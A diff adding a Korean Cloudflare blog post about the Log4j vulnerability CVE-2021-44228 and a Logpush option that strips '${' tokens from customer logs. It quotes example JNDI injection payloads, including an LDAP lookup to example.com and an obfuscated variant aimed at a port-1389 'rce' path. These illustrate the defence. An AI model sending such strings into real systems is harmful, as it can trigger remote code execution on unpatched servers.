@@ -1,0 +1,18 @@
+<div class="post-content lh-copy gray1">
+	<p>2021년 12월 9일에 모두가 <a href="https://logging.apache.org/log4j/2.x/index.html" target="_blank">Apache Log4j 유틸리티</a>에 영향을 주는 제로 데이 취약점 공격인 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a>에 대해 알게 되었습니다. Cloudflare에서는 이러한 취약점으로부터 보호하기 위해 즉시 <a href="https://blog.cloudflare.com/ko-kr/cve-2021-44228-log4j-rce-0-day-mitigation-ko-kr/">당사의 WAF를 업데이트했지만</a> 시스템을 최대한 빨리 업데이트하도록 고객에게 권장하고 있습니다.</p>
+	<p>다만 많은 수의 Cloudflare 고객이 Log4j를 사용하는 소프트웨어를 통해 자신의 로그를 사용하고 있음을 알기에 Cloudflare Logs를 통한 모든 취약점 공격 시도 또한 완화하고 있습니다. 이 글을 작성하는 시점에 당사가 고객에게 전송하는 로그에서 확인되는 취약점 공격 패턴은 초당 최대 1,000회입니다.</p>
+	<p>지금부터 고객은 자신의 Logpush 작업이 이 취약점을 트리거할 수 있는 토큰을 자동으로 삭제하도록 업데이트할 수 있습니다. 이에 대한 세부적인 내용은 당사의 <a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration#options" target="_blank">개발자 문서</a>나 아래 세부 정보에서 확인할 수 있습니다.</p>
+	<h3 id="-"><strong>공격 방법</strong></h3>
+	<p>Log4j 취약점 작동 방법은 <a href="https://blog.cloudflare.com/ko-kr/inside-the-log4j2-vulnerability-cve-2021-44228-ko-kr/">당사의 블로그 포스팅</a>에서 확인할 수 있습니다. 요약하자면 공격자는 ${jndi:ldap://example.com/a}와 같은 것을 모든 문자열에 추가할 수 있습니다. 그 다음에 Log4j에서는 이 객체를 검색하기 위해 인터넷과 연결합니다.</p>
+	<p>Cloudflare Logs에는 사용자 에이전트나 URL 경로와 같이 공용 인터넷에서 최종 사용자가 제어하는 많은 수의 문자열 필드가 포함되어 있습니다. 이 취약점을 통해 악의적인 사용자는 이러한 필드를 읽고 패치되지 않은 Log4j 인스턴스를 사용하는 모든 시스템에서 원격 코드 실행을 유발할 수 있습니다.</p>
+	<h3 id="--1"><strong>당사의 완화 계획</strong></h3>
+	<p>안타깝게도 단순히 ${jndi:ldap와 같은 토큰을 확인하는 것은 이 취약점으로부터 보호하는 데 충분하지 않습니다. 템플릿 언어의 표현성으로 인해 난독화된 변형도 확인해야 합니다. 이미 외부에서 ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}와 같은 변형을 사용하는 공격자가 있음을 확인했습니다. 그렇기에 ${ 토큰을 삭제하는 것은 이 취약점으로부터 보호하는 가장 일반적인 방법입니다.</p>
+	<p>${ 토큰은 당사가 고객에게 전송하는 로그에서 초당 최대 1,000회 나타나고 있습니다. 일부 레코드의 무작위 검사에서 많은 수가 이 취약점을 공격하려는 시도가 <em>아님</em>을 보여줍니다. 따라서 이러한 토큰을 자신의 로그에서 보기를 기대하는 고객에게 영향을 미치지 않고 안전하게 당사의 로그를 삭제할 수 없습니다.</p>
+	<p>지금부터 고객은 자신의 Logpush 작업을 업데이트하여 ${ 문자열을 삭제하고 어디에서나 이를 x{으로 대체할 수 있습니다.</p>
+	<p>이를 활성화하려면 고객은 자신의 Logpush 작업 옵션 구성을 업데이트하여 CVE-2021-44228=true 파라미터를 포함시켜야 합니다. Logpush API 사용 방법에 대한 상세한 지침은 <a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration/examples/example-logpush-curl#step-6---updating-logpull_options" target="_blank">당사의 개발자 문서</a>의 예시에서 확인하시기 바랍니다. 이 옵션은 현재 Cloudflare Dashboard에서 사용할 수 없으며 API를 사용해야만 변경 가능한 점 참고 부탁드립니다.</p>
+	<p><a href="https://twitter.com/intent/tweet?in_reply_to=1470704925785169921" target="_blank"><strong>Twitter에서 의논하기</strong></a> <a href="https://news.ycombinator.com/item?id=29551847" target="_blank"><strong> Hacker News에서 의논하기</strong></a> <a href="https://reddit.com/r/CloudFlare/comments/rg5erl/sanitizing_cloudflare_logs_to_protect_customers/" target="_blank"><strong> Reddit에서 의논하기</strong></a></p>
+	<p><a href="https://blog.cloudflare.com/tag/logs/">로그</a> <a href="https://blog.cloudflare.com/tag/vulnerabilities/">취약점</a> <a href="https://blog.cloudflare.com/tag/zero-day-threats/">제로 데이 위협</a> <a href="https://blog.cloudflare.com/tag/security/">보안</a> <a href="https://blog.cloudflare.com/tag/log4j/">Log4J</a></p>
+	<p>Twitter에서 팔로우하기</p>
+	<p>Jon Levine |<a href="https://twitter.com/@jplevine" target="_blank">@jplevine</a></p>
+	<p>Cloudflare |<a href="https://twitter.com/Cloudflare" target="_blank">Cloudflare</a><br></p>
+</div>
